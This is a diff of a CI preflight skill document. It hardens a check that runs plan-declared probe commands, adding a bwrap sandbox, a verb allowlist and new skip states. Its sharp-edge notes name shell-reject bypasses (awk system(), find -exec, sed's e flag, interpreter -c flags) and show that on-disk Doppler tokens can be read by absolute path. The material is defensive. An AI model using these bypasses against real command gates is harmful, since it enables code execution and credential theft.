 | 1 | No PR linked plan file | `$PLAN_PATH` empty after Shared Plan-File Resolution | **SKIP** | Indeterminate — Check 6 will fire if a section is required; Check 10 cannot run without a plan file. |
 | 2 | Plan exists, no `## Observability` block | `awk` returns empty in Step 10.3 | **FAIL** | Sensitive-path diff requires an Observability block per `hr-observability-as-plan-quality-gate`. |
 | 3 | Block exists, no `discoverability_test.command` parsed | `$CMD` empty after both Form A + B attempts | **FAIL** | Rule violation — the load-bearing field of the schema is missing. |
-| 4 | Command DNS-fails | `$DT_RC == 6` (curl: "Could not resolve host") | **FAIL** | The hostname-typo class — the exact #4148 regression. |
-| 5 | Command times out | `$DT_RC == 28` (curl) OR `$DT_RC == 124` (timeout(1)) | **FAIL** | Endpoint unreachable; DNS resolved but no response in 15s. |
-| 6 | Command returns a code/output the plan's `expected_output` does NOT include | `$DT_STDOUT_SAFE` not present in `$EXPECTED` | **FAIL** | Plan's expectation drifted from production reality. |
-| 7 | Command requires creds not in Doppler (auth-gated probe) | `$DT_RC == 22` AND HTTP 401/403 AND `$EXPECTED` does NOT explicitly list 401/403 | **SKIP** | Auth-gated probe with no operator creds; surface diagnostic suggesting to add a Doppler-fetched probe variant. |
-| 8 | Command returns expected output | All other paths — `$DT_RC == 0` AND stdout matches `$EXPECTED` | **PASS** | Invariant proven by live execution. |
+| 4 | Probe declares `credentials_required` (non-placeholder) | `$CREDS_REQ` non-empty and not a placeholder | **SKIP-DECLARED** | The property has no unauthenticated substitute. Executing it in the sandbox would fail for lack of credentials and prove nothing. Waives verification, not execution — the command never runs. |
+| 5 | `credentials_required` is placeholder text | `$CREDS_REQ` matches `TODO`/`TBD`/`N/A`/… | **FAIL** | A declaration that says nothing waives nothing (deepen-plan §4.7 placeholder machinery). |
+| 6 | Verb not on `PROBE_VERB_ALLOWLIST` | [probe-verb-gate.sh](./scripts/probe-verb-gate.sh) exits 1 | **FAIL** | Deny-by-default, with no path-shaped exemption. Schema validation, not a security control — see Step 10.4. The reason names both remedies (repo-relative script; `credentials_required`) and the allowlist-extension route. |
+| 7 | Sandbox unavailable or cannot be established | `bwrap` absent, or both `--proc` and no-`--proc` establishment attempts fail | **SKIP-NOSANDBOX** | Fail-closed. Never falls back to unsandboxed execution. Its OWN terminal: folded into ordinary SKIP, "the gate verified nothing" was byte-identical to "the gate had nothing to do". bwrap is Linux-only, so on macOS this is the steady state. Emits `SOLEUR_PREFLIGHT_CHECK10_NOSANDBOX` so it is countable across the fleet. |
+| 8 | Command DNS-fails | `$DT_RC == 6` (curl: "Could not resolve host") | **FAIL** | The hostname-typo class — the exact #4148 regression. |
+| 9 | Command times out | `$DT_RC == 28` (curl) OR `$DT_RC == 124` (timeout(1)) | **FAIL** | Endpoint unreachable; DNS resolved but no response in 15s. |
+| 10 | Command requires creds not in Doppler (auth-gated probe) | `$DT_RC == 22` AND HTTP 401/403 AND `$EXPECTED` does NOT explicitly list 401/403 | **SKIP** | Auth-gated probe with no operator creds; surface diagnostic suggesting a `credentials_required` declaration or a Doppler-fetched probe variant. |
+| 10b | Command not found in the sandbox | `$DT_RC == 127` | **FAIL** | The probe's program is not on the sandbox `PATH` (`/usr/local/bin:/usr/bin:/bin`), which is deliberately NOT widened — that would be an authority grant inside a change that narrows authority. Wrap the probe in a repo-relative script, or use an allowlisted verb. Reported as its own state because falling through to row 11 blamed "expectation drift" for a cause the code measured exactly. |
+| 11 | Command returns a code/output the plan's `expected_output` does NOT include | `$DT_STDOUT_SAFE` not present in `$EXPECTED` | **FAIL** | Plan's expectation drifted from production reality. |
+| 12 | Command returns expected output | All other paths — `$DT_RC == 0` AND stdout matches `$EXPECTED` | **PASS** | Invariant proven by live execution inside the sandbox. |
 
 **Expected-output matching semantics.** When `$EXPECTED` is a comma-separated or "or"-joined list (e.g., `200 or 401`, `200, 401`, `["200","401"]`), tokenize on `,|\s+or\s+|\bor\b|[\`"\[\]/]+` and treat as a list. Match if any token is a non-empty substring of `$DT_STDOUT_SAFE`. When `$EXPECTED` is a single value, substring-match. The tokenizer accepts both `200` and `"200"`.
 
 **Step 10.7: Headless mode behaviour.**
 
-On **FAIL**, abort with the diagnostic table (command, exit code, sanitized stdout, expected). On **PASS** or **SKIP**, continue silently.
+On **FAIL**, abort with the diagnostic table (command, exit code, sanitized stdout, expected). On **PASS** or **SKIP**, continue silently. On **SKIP-DECLARED**, continue but **emit one line** naming the declared scope verbatim — this terminal exists to be seen, and silencing it would defeat the drift control it was built for. On **SKIP-NOSANDBOX**, continue but **emit one line** plus the `SOLEUR_PREFLIGHT_CHECK10_NOSANDBOX` sentinel: the check did not run, and that fact must reach both the operator and the fleet-level marker pipeline.
 
 **Step 10.8: Interactive mode behaviour.**
 
@@ -937,9 +1265,11 @@ On **FAIL**, present the failure reason + sanitized command + diagnostic and off
 
 **Result:**
 
-- **PASS** — Sensitive-path diff with valid plan-linked Observability block AND command ran AND output matches `expected_output`.
-- **FAIL** — Sensitive-path diff with any of: missing Observability block, missing `discoverability_test.command`, command requires SSH, command contains shell substitution, DNS failure, timeout, or output mismatch.
+- **PASS** — Sensitive-path diff with valid plan-linked Observability block AND command ran inside the sandbox AND output matches `expected_output`.
+- **FAIL** — Sensitive-path diff with any of: missing Observability block, missing `discoverability_test.command`, command requires SSH, verb not on `PROBE_VERB_ALLOWLIST` (no path-shaped exemption), placeholder `credentials_required`, command contains shell substitution, DNS failure, timeout, or output mismatch.
 - **SKIP** — No sensitive paths touched, OR no PR available, OR no plan file linked from PR body, OR command is auth-gated with no operator creds.
+- **SKIP-NOSANDBOX** — The bwrap sandbox is unavailable or could not be established (fail-closed — never an unsandboxed fallback). Reported distinctly from **SKIP** because "the check could not run" and "the check had nothing to do" are different facts, and only one of them means a security gate is dark. Emits a `SOLEUR_*` sentinel so it is countable across the fleet rather than one line of local stdout.
+- **SKIP-DECLARED** — The plan declares a non-placeholder `discoverability_test.credentials_required`. The command was **not executed**; the declared scope is surfaced verbatim. Reported distinctly from **SKIP** everywhere (headless line, Phase 2 aggregate row) because it is a verification waiver a reviewer must be able to see.
 
 ### Check 7: Canary Probe Set Covers Authenticated Surface
 
@@ -1090,7 +1420,7 @@ After all checks complete, aggregate results into a structured report:
 | Canary Probe Set Covers Auth Surface | PASS/FAIL/SKIP | <details> |
 | SW Cache Bump on Client-Bundle Fix | PASS/FAIL/SKIP | <details> |
 | Node-Only Encodings Banned in Client-Bundle | PASS/FAIL | <details> |
-| Discoverability Test Execution | PASS/FAIL/SKIP | <details> |
+| Discoverability Test Execution | PASS/FAIL/SKIP/SKIP-DECLARED/SKIP-NOSANDBOX | <details> — on SKIP-DECLARED, quote the declared `credentials_required` scope verbatim so the waiver is visible in the aggregate; on SKIP-NOSANDBOX, state plainly that Check 10 did not execute on this host and why |
 
 **Overall: PASS / FAIL**
 ```
@@ -1118,11 +1448,17 @@ Preflight validation passed. Return control to the calling orchestrator.
 
 - **Triple-SSOT for `SENSITIVE_PATH_RE`.** The literal lives at Check 6 Step 6.1, Check 10 Step 10.1, AND `plugins/soleur/skills/deepen-plan/SKILL.md` Phase 4.6 Step 2. All three MUST stay byte-identical. The Check 10 regression test (`plugins/soleur/test/preflight-discoverability-test.test.ts`) asserts ≥2 matches in `preflight/SKILL.md`; the canonical grep is `grep -cF "SENSITIVE_PATH_RE='^(apps/web-platform" plugins/soleur/skills/preflight/SKILL.md plugins/soleur/skills/deepen-plan/SKILL.md`. `grep -cF` is substring-based and tolerates the 2-space indentation difference between top-level (preflight) and markdown-bullet (deepen-plan) contexts — keep AC2's grep un-anchored.
 - **Shared Plan-File Resolution is a SSOT.** Both Check 6 Step 6.2 and Check 10 Step 10.2 call it. A future PR that changes the scrub/extract logic must edit the shared sub-section once — both consumers pick it up. Do NOT copy-paste the logic back into a caller block.
-- **Check 10 parser duality (Form A YAML vs Form B prose+fence).** PR #4148 used Form B; the canonical template uses Form A. Both must be accepted OR Check 10 silently SKIPs on currently-valid plans. The TS reference impl at `plugins/soleur/test/lib/discoverability-test-parser.ts` exercises both forms across all 8 fixtures.
+- **Check 10 parser duality (Form A YAML vs Form B prose+fence).** PR #4148 used Form B; the canonical template uses Form A. Both must be accepted OR Check 10 silently SKIPs on currently-valid plans. The TS reference impl at `plugins/soleur/test/lib/discoverability-test-parser.ts` exercises both forms across every fixture in `plugins/soleur/test/fixtures/preflight-check-10/`.
 - **Rule order in `parse-form-a.awk` IS the bug (#6772).** The inline rule `/^[[:space:]]*command:/` matches EVERY `command:` line, including `command: >-` and `command: |`. If it is ever moved ahead of the fold/block header rules it returns the literal indicator, which then self-rejects against Step 10.5's shell-active `>` branch — a check that cannot parse its input, reporting a shell injection the plan does not have. AC1 and fixtures F1–F3 are the pins; do not drop them when refactoring.
 - **Anchoring the header regex is a bug generator.** A bare `$` anchor made `command: >- # note` fall through to inline and reproduce #6772 exactly. Any future tightening of the header must keep the comment-tolerant `(#.*)?$` tail and re-run the F1–F3 comment column.
 - **`indent()` returns 0 on a blank line**, which is `<= key` for every scalar. The blank-line skip rule MUST stay above the indent terminator or every scalar ends at its first blank line (fixture N6).
-- **`env -i` does not scrub file-backed CLI auth.** Step 10.5 preserves `HOME`, so the Doppler CLI's on-disk token stays reachable by any command Check 10 executes. Never cite `env -i` as a mitigation for a credential-bearing command — Step 10.4's verb rejects are what cover that class.
-- **The shell-active reject does not bound a folded command.** Folding joins with a space, so a folded scalar has no `;`/`|`/`$()` by construction and passes Step 10.5 automatically — it can append *arguments* but never chain a command. That makes fold safer than block for injection, but it also means no token in the Step 10.5 set constrains what a folded command *is*. Reasoning "the reject will catch it" about a folded command is reasoning about the wrong gate.
+- **`env -i` scrubs environment *variables*, never *files or sockets* — and an ephemeral `$HOME` is the same mistake wearing a better name.** `env -i` cannot remove an on-disk credential store, and setting `HOME` to a temp dir only changes where a CLI *looks*: measured during #7393, an absolute-path read of the operator's home Doppler config returned a live 294-byte service token under `HOME=$(mktemp -d)`, and a glob read across `/home/*/…` did too. Never cite either as a mitigation for a credential-bearing command. What covers that class is the Step 10.5 **filesystem boundary** (bwrap: `/home`, `/root`, `/run` replaced with tmpfs; repo bound read-only) — the verb allowlist in Step 10.4 bounds *legibility and maintenance*, not authority.
+- **Probe the invariant, not the proxy — this gate's own history is the cautionary tale.** #7393's first design measured `doppler configure get token`'s **exit code** (0 even with no token) and read it as "credential still reachable". Corrected to token length plus a live read, it then measured **credential discovery** and reported it as **credential reachability** — and shipped a Sharp Edge congratulating itself for escaping exactly that trap, one section above the place it committed it. Any claim about credential reachability must be tested by reading the file **at its absolute path, from inside the real execution environment**.
+- **A fail-closed gate can fail closed for the wrong reason, and it looks identical to working.** `--proc /proc` cannot be mounted inside a nested user namespace (the repo already knows this — `enableWeakerNestedSandbox`, #1557). A hard `--proc` would fail sandbox establishment in every containerized run, and the fail-closed design would then SKIP Check 10 everywhere — a blanket disablement whose telemetry is indistinguishable from correct operation. Whenever a gate's failure mode is "skip", enumerate the environments where establishment fails *for reasons unrelated to the threat*, and **degrade** rather than skip in those.
+- **`--tmpfs /home` must precede `--ro-bind "$REPO_ROOT"`.** bwrap applies mounts in order and this repo lives under `/home`. Reversed, the tmpfs silently clobbers the repo bind and every probe dies with `Can't chdir` — a failure that reads as a bwrap incompatibility rather than an ordering bug. The agent sandbox's module header documents the same tmpfs-shadows-earlier-binds semantics (#5733 / PR #5848); two independent discoveries of one rule.
+- **`--tmpfs /run` breaks DNS on systemd-resolved hosts.** The resolver config at /etc/resolv.conf is a symlink into the systemd-resolved stub under /run; tmpfs'ing `/run` removes the target, and every `curl` probe then returns rc=6 — **indistinguishable from the #4148 DNS-typo regression Check 10 exists to catch**. Bind the resolved target (`readlink -f` the resolver config) after the tmpfs. Written unquoted deliberately: the skill-security-scan `path-traversal-absolute` rule matches a quote or backtick immediately followed by a system path, so presenting these as code literals turns explanatory prose into a REVIEW finding.
+- **`awk`, `sed` and `find` are `bash -c` in disguise.** Measured: `awk 'BEGIN{system("…")}'` executes arbitrary commands and passes the shell-active reject (no `;`, `&&`, `|`, `$(`). Rejecting `bash -c` while allowlisting `awk` would be incoherent, so all three are excluded — as are `python3 -c`, `node -e`, `bun -e`, GNU `sed`'s `e` flag, and `find -exec`.
+- **`git ls-files --error-unmatch` is not a review oracle.** It interrogates the **PR-head index** — the attacker's own branch — and preflight runs *before* merge. "Tracked" and "reviewed" are different properties. That is why the program-path rule here is a pure string rule and the sandbox, not a tracking check, is what contains the script.
+- **The shell-active reject does not bound a folded command.** Folding joins with a space, so a folded scalar has no `;`/`|`/`$()` by construction and passes the reject automatically — it can append *arguments* but never chain a command. That makes fold safer than block for injection, but it also means no token in that reject set constrains what a folded command *is*. Reasoning "the reject will catch it" about a folded command is reasoning about the wrong gate; the verb allowlist and the sandbox are the gates that apply.
 - **`bash -c "$CMD"` stdout always ends in `\n`.** The matcher MUST normalize trailing newlines (via `sanitize()` or `${var%$'\n'}`) before substring comparison, or `expected_output: 200` fails when production correctly emits `200\n`.
 - **The `\b` word-boundary trap.** Bash `[[ $x =~ \bssh \b ]]` matches `ssh ` only when whitespace is on BOTH sides; trailing-EOF or trailing-newline `ssh ` does NOT match. Always use `(^|[[:space:]])ssh([[:space:]]|$)` — the canonical Check 10 reject form — when checking for `ssh ` in operator-facing prose.
